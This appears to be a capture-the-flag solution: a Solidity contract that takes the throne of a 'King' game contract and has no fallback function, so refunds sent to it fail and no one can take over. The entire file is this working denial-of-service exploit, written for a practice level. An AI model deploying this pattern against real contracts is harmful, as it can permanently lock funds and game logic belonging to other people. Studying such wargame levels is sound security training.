// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Level9 {
    King king;

    constructor(address payable kingAddr) public {
        king = King(kingAddr);
    }

    function main() external payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        success; // silence compiler warning
    }

    // No fallback function = `king.transfer` will fail
}
